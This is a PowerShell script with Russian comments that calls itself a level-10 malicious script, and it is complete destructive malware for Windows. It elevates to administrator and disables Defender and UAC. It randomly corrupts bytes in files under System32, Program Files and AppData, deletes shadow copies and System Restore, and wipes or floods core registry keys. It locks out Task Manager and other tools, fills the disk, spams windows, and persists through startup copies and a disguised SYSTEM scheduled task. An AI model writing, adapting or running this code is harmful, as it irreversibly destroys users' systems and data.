<#
    ⚠️ ВРЕДОНОСНЫЙ СКРИПТ ⚠️
    Уровень: 10/10
    Описание: Полный хаос — постоянная смена курсоров, повреждение файлов, уничтожение реестра и системы.
    Запуск на основной машине приведёт к полной неработоспособности Windows.
#>

# ========== 1. ИНИЦИАЛИЗАЦИЯ И ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ==========
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# ========== 2. ОТКЛЮЧЕНИЕ ЗАЩИТЫ ==========
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles $true -ErrorAction SilentlyContinue
Set-MpPreference -CloudBlockLevel "NotConfigured" -ErrorAction SilentlyContinue
Set-MpPreference -CloudTimeout 1000 -ErrorAction SilentlyContinue
Set-MpPreference -CloudTimeoutIndicator 1000 -ErrorAction SilentlyContinue

# Отключаем UAC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force

# ========== 3. ФУНКЦИИ ДЛЯ КУРСОРОВ ==========
function Set-RandomCursorTheme {
    # Список тем курсоров Windows
    $themes = @(
        "Windows Default",
        "Windows Black",
        "Windows Inverted",
        "Windows Standard (large)",
        "Windows Standard (extra large)",
        "Handwriting",
        "Magnified"
    )
    # На самом деле мы будем напрямую задавать случайные курсоры из системной папки
    $cursorsPath = "$env:SystemRoot\Cursors"
    $cursorFiles = Get-ChildItem -Path $cursorsPath -Include *.cur,*.ani -Recurse -ErrorAction SilentlyContinue
    $cursorNames = @(
        "Arrow", "Wait", "AppStarting", "Help", "IBeam", "No", 
        "SizeNS", "SizeWE", "SizeNWSE", "SizeNESW", "SizeAll", "UpArrow"
    )
    
    # Выбираем случайный файл для всех типов указателей
    $randomCursor = $cursorFiles | Get-Random
    foreach ($name in $cursorNames) {
        Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name $name -Value $randomCursor.FullName -ErrorAction SilentlyContinue
    }
    # Применяем изменения
    $signature = @'
    [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
    public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
'@
    $type = Add-Type -MemberDefinition $signature -Name "Win32Cursor" -Namespace Win32Functions -PassThru
    $type::SystemParametersInfo(0x0057, 0, 0, 0x01 | 0x02)  # SPI_SETCURSORS
}

# ========== 4. ПОСТОЯННОЕ ИЗМЕНЕНИЕ КУРСОРОВ (ФОНОВЫЙ ПРОЦЕСС) ==========
$cursorJob = Start-Job -ScriptBlock {
    while ($true) {
        # Случайная задержка от 0.5 до 5 секунд
        Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 5000)
        
        # Снова меняем курсоры
        $cursorsPath = "$env:SystemRoot\Cursors"
        $cursorFiles = Get-ChildItem -Path $cursorsPath -Include *.cur,*.ani -Recurse -ErrorAction SilentlyContinue
        $cursorNames = @("Arrow", "Wait", "AppStarting", "Help", "IBeam", "No", "SizeNS", "SizeWE", "SizeNWSE", "SizeNESW", "SizeAll", "UpArrow")
        if ($cursorFiles.Count -gt 0) {
            $randomCursor = $cursorFiles | Get-Random
            foreach ($name in $cursorNames) {
                Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name $name -Value $randomCursor.FullName -ErrorAction SilentlyContinue
            }
            # Применяем изменения
            Add-Type -MemberDefinition @'
            [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
            public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
'@ -Name "CursorUpdater" -Namespace Win32 -PassThru | Out-Null
            [Win32.CursorUpdater]::SystemParametersInfo(0x0057, 0, 0, 0x01 | 0x02) 2>$null
        }
    }
}

# ========== 5. ФУНКЦИЯ ПОВРЕЖДЕНИЯ ФАЙЛОВ (ИЗМЕНЕНИЕ БАЙТОВ) ==========
function Corrupt-Files {
    param(
        [string]$Path,
        [int]$Depth = 0,
        [int]$MaxDepth = 3
    )
    if ($Depth -gt $MaxDepth) { return }
    
    try {
        Get-ChildItem -Path $Path -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            Corrupt-Files -Path $_.FullName -Depth ($Depth + 1) -MaxDepth $MaxDepth
        }
        
        Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue | Where-Object {
            $_.Extension -match '\.(exe|dll|sys|bat|cmd|ps1|vbs|docx|xlsx|pptx|pdf|jpg|png|mp3|mp4|zip|rar|7z|bak|reg|ini|config)$' -or
            $_.Length -lt 50MB  # не трогаем очень большие файлы, чтобы не зависнуть
        } | ForEach-Object {
            try {
                # Открываем файл, читаем байты, портим случайные 10-30% байтов
                $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                if ($bytes.Length -eq 0) { return }
                
                $corruptPercent = Get-Random -Minimum 10 -Maximum 31  # 10-30%
                $numBytesToCorrupt = [math]::Floor($bytes.Length * $corruptPercent / 100)
                for ($i = 0; $i -lt $numBytesToCorrupt; $i++) {
                    $pos = Get-Random -Minimum 0 -Maximum $bytes.Length
                    $bytes[$pos] = Get-Random -Minimum 0 -Maximum 256  # случайный байт
                }
                [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
            } catch {
                # Пропускаем, если файл заблокирован
            }
        }
    } catch {}
}

# ========== 6. ЗАПУСК ПОВРЕЖДЕНИЯ В ФОНЕ ДЛЯ ВАЖНЫХ ПАПОК ==========
$corruptJob1 = Start-Job -ScriptBlock {
    param($p)
    Corrupt-Files -Path $p
} -ArgumentList "$env:SystemRoot\System32"

$corruptJob2 = Start-Job -ScriptBlock {
    param($p)
    Corrupt-Files -Path $p
} -ArgumentList "$env:SystemRoot\SysWOW64"

$corruptJob3 = Start-Job -ScriptBlock {
    param($p)
    Corrupt-Files -Path $p
} -ArgumentList "$env:ProgramFiles"

$corruptJob4 = Start-Job -ScriptBlock {
    param($p)
    Corrupt-Files -Path $p
} -ArgumentList "$env:ProgramFiles(x86)"

$corruptJob5 = Start-Job -ScriptBlock {
    param($p)
    Corrupt-Files -Path $p
} -ArgumentList "$env:APPDATA"

$corruptJob6 = Start-Job -ScriptBlock {
    param($p)
    Corrupt-Files -Path $p
} -ArgumentList "$env:LOCALAPPDATA"

# ========== 7. ДОПОЛНИТЕЛЬНЫЕ РАЗРУШИТЕЛЬНЫЕ ДЕЙСТВИЯ ==========

# Удаляем теневые копии (чтобы нельзя было восстановиться)
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }

# Отключаем восстановление системы
Disable-ComputerRestore -Drive "C:\"
vssadmin delete shadows /all /quiet

# Повреждаем реестр: удаляем важные ключи, заполняем мусором
# (Это очень опасно, система перестанет загружаться)
$keysToCorrupt = @(
    "HKLM:\SYSTEM\CurrentControlSet\Services",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "HKLM:\SYSTEM\Setup"
)
foreach ($key in $keysToCorrupt) {
    try {
        # Удаляем ключ (если возможно)
        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
        # Или создаём случайные значения для тех же путей
        $null = New-Item -Path $key -Force
        for ($i=0; $i -lt 100; $i++) {
            New-ItemProperty -Path $key -Name "Random$i" -Value ([guid]::NewGuid().ToString()) -PropertyType String -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Меняем важные системные файлы (замена байтов прямо в процессе работы)
# Но они уже портятся через Corrupt-Files, дополнительно можно запустить процесс,
# который будет постоянно перезаписывать случайные байты в работающих процессах.

# ========== 8. БЛОКИРОВКА ПОЛЬЗОВАТЕЛЯ ==========
# Запрещаем диспетчер задач, реестр, cmd и т.д.
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRun" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoFind" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoFolderOptions" -Value 1 -Force

# ========== 9. ФОНОВЫЕ ПРОЦЕССЫ ДЛЯ ПОСТОЯННОГО ХАОСА ==========
# 1) Каждые 10 секунд меняем обои на случайный цвет
$wallpaperJob = Start-Job -ScriptBlock {
    while ($true) {
        $color = "#{0:X6}" -f (Get-Random -Max 0xFFFFFF)
        $code = @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
        Add-Type -TypeDefinition $code -Language CSharp
        [Wallpaper]::SystemParametersInfo(0x0014, 0, "", 0x01 | 0x02)
        Start-Sleep -Seconds 10
    }
}

# 2) Каждые 30 секунд открываем множество окон cmd с сообщениями
$popupJob = Start-Job -ScriptBlock {
    while ($true) {
        for ($i=0; $i -lt 20; $i++) {
            Start-Process cmd -ArgumentList "/c title ПАНДЕМИЯ & color 0c & echo ВАША СИСТЕМА УНИЧТОЖЕНА & timeout 5" -WindowStyle Normal
        }
        Start-Sleep -Seconds 30
    }
}

# 3) Заполнение диска мусором (создание больших файлов, пока не кончится место)
$diskFillJob = Start-Job -ScriptBlock {
    $temp = [System.IO.Path]::GetTempPath()
    while ($true) {
        $file = Join-Path $temp "trash_$(Get-Random).bin"
        $stream = [System.IO.File]::OpenWrite($file)
        $buffer = New-Object byte[] 10485760  # 10 MB
        (New-Object Random).NextBytes($buffer)
        for ($i=0; $i -lt 10; $i++) { $stream.Write($buffer, 0, $buffer.Length) }
        $stream.Close()
        Start-Sleep -Seconds 5
    }
}

# ========== 10. ЗАВЕРШЕНИЕ И ПОДДЕРЖАНИЕ АКТИВНОСТИ ==========
# Копируем скрипт в автозагрузку и в несколько мест
$scriptContent = Get-Content $PSCommandPath -Raw
$destinations = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_update.ps1",
    "$env:SystemRoot\Temp\svchost.ps1",
    "$env:SystemRoot\System32\drivers\etc\hosts.ps1"  # странное место
)
foreach ($dest in $destinations) {
    try { $scriptContent | Out-File -FilePath $dest -Force } catch {}
}

# Добавляем задачу в планировщик для запуска при старте системы (даже в безопасном режиме)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$env:SystemRoot\Temp\svchost.ps1`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Compatibility Win8
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force

# ========== 11. БЕСКОНЕЧНОЕ ОЖИДАНИЕ (ЧТОБЫ ФОНОВЫЕ ЗАДАЧИ НЕ УМЕРЛИ) ==========
Write-Host "Система обречена. Наслаждайтесь хаосом." -ForegroundColor Red
while ($true) {
    Start-Sleep -Seconds 3600
}